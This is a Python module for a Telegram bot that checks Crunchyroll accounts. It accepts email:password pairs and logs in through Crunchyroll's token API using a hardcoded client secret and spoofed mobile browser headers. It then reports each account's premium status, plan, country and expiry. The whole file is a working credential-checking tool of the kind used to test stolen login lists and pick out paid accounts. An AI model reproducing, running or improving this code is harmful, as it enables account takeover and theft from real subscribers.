# ============================================================
# CRUNCHYROLL ACCOUNT CHECKER SERVICE
# ============================================================

import re
import uuid
import requests
from datetime import datetime, timezone
from typing import Dict

from telegram import Update
from telegram.ext import ContextTypes, ConversationHandler

from config import E
from utils import pe, update_bot_stats
from user_agent import generate_user_agent


# ─── Constants ──────────────────────────────────────────────

CRUNCHYROLL_CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CRUNCHYROLL_CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
WAITING_CRUNCHYROLL_CREDS = 7


# ─── Core Functions ─────────────────────────────────────────

def crunchyroll_get_days(expiry_date: str) -> int:
    try:
        expiry = datetime.strptime(expiry_date, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        current = datetime.now(timezone.utc)
        delta = expiry - current
        return max(0, delta.days)
    except:
        return 0


def crunchyroll_check(email: str, password: str) -> dict:
    user_agent = generate_user_agent()
    device_id = str(uuid.uuid4())

    login_headers = {
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": user_agent,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://sso.crunchyroll.com",
        "Referer": "https://sso.crunchyroll.com/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }

    login_data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "offline_access",
        "client_id": CRUNCHYROLL_CLIENT_ID,
        "client_secret": CRUNCHYROLL_CLIENT_SECRET,
        "device_type": "@xyz",
        "device_id": device_id,
        "device_name": "Luis"
    }

    try:
        r1 = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=login_headers, data=login_data)
        login_r = r1.json()

        if "error" in login_r:
            return {"success": False, "error": login_r.get('error', 'Login failed')}
        if "access_token" not in login_r:
            return {"success": False, "error": "No access token"}

        act = login_r["access_token"]

        headers = {
            "etp-anonymous-id": "64a91812-bb46-40ad-89ca-ff8bb567243d",
            "Accept": "application/json, text/plain, */*",
            "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Authorization": f"Bearer {act}",
            "User-Agent": user_agent,
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.crunchyroll.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        }

        r2 = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers)
        data = r2.json()
        account_id = data.get("account_id")
        external_id = data.get("external_id")

        email_verified = "Unknown"
        ev_match = re.search(r'"email_verified":([^,}]*)', r2.text)
        if ev_match:
            email_verified = ev_match.group(1).strip()

        # Check subscription
        r3 = requests.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
            headers={"Authorization": f"Bearer {act}"}
        )
        is_premium = '"total":0,' not in r3.text

        country = "Unknown"
        country_match = re.search(r'"subscription_country":"([^"]*)"', r3.text)
        if country_match:
            country = country_match.group(1).strip()

        # Get subscription details
        r4 = requests.get(
            f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{account_id}",
            headers={"Authorization": f"Bearer {act}"}
        )
        sub_data = r4.text

        is_active = "Unknown"
        active_match = re.search(r'"is_active":([^,}]*)', sub_data)
        if active_match:
            is_active = active_match.group(1).strip()

        plan = "Unknown"
        sku_match = re.search(r'"sku":"([^"]*)"', sub_data)
        if sku_match:
            plan = sku_match.group(1).strip()

        expiry = "N/A"
        ex_match = re.search(r'"expiration_date":"([^"]*)"', sub_data)
        if ex_match:
            expiry = ex_match.group(1).split("T")[0]
        else:
            ex2 = re.search(r'"next_renewal_date":"([^"]*)"', sub_data)
            if ex2:
                expiry = ex2.group(1).split("T")[0]

        days_remaining = crunchyroll_get_days(expiry) if expiry != "N/A" else 0

        return {
            "success": True,
            "email": email,
            "email_verified": email_verified,
            "is_premium": is_premium,
            "country": country,
            "is_active": is_active,
            "plan": plan,
            "expiry": expiry,
            "days_remaining": days_remaining
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


# ─── Handler ─────────────────────────────────────────────────

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the Crunchyroll checker conversation."""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"{pe(E['globe'])} <b>Crunchyroll Account Checker</b>\n\n"
        f"{pe(E['next'])} Send credentials in format:\n"
        f"<code>email:password</code>\n\n"
        f"{pe(E['bolt'])} I will check the account status.",
        reply_markup=cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_CRUNCHYROLL_CREDS


async def handle_creds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle credentials and check Crunchyroll account."""
    creds = update.message.text.strip()
    if ':' not in creds:
        await update.message.reply_html(
            f"{pe(E['cross'])} Invalid format. Use <code>email:password</code>",
            reply_markup=cancel_button()
        )
        return WAITING_CRUNCHYROLL_CREDS

    email, password = creds.split(':', 1)

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Checking account..."
    )

    result = crunchyroll_check(email, password)

    if result.get('success'):
        text = (
            f"{pe(E['check'])} <b>Account Check Complete</b>\n\n"
            f"{pe(E['bolt'])} <b>Email:</b> {result.get('email', 'Unknown')}\n"
            f"{pe(E['bolt'])} <b>Email Verified:</b> {result.get('email_verified', 'Unknown')}\n"
            f"{pe(E['gem'])} <b>Status:</b> {'PREMIUM' if result.get('is_premium') else 'FREE'}\n"
            f"{pe(E['globe'])} <b>Country:</b> {result.get('country', 'Unknown')}\n"
            f"{pe(E['bolt'])} <b>Active:</b> {result.get('is_active', 'Unknown')}\n"
            f"{pe(E['star'])} <b>Plan:</b> {result.get('plan', 'Unknown')}\n"
            f"{pe(E['hourglass'])} <b>Expiry:</b> {result.get('expiry', 'N/A')}\n"
            f"{pe(E['bolt'])} <b>Days Left:</b> {result.get('days_remaining', 0)}"
        )
        await status_msg.edit_text(text, reply_markup=back_button())
        update_bot_stats(True)
    else:
        await status_msg.edit_text(
            f"{pe(E['cross'])} <b>Check Failed</b>\n\n"
            f"{pe(E['warn'])} {result.get('error', 'Unknown error')}",
            reply_markup=back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END


def cancel_button():
    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
    from config import E
    from utils import pe
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )]
    ])


def back_button():
    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
    from config import E
    from utils import pe
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )]
    ])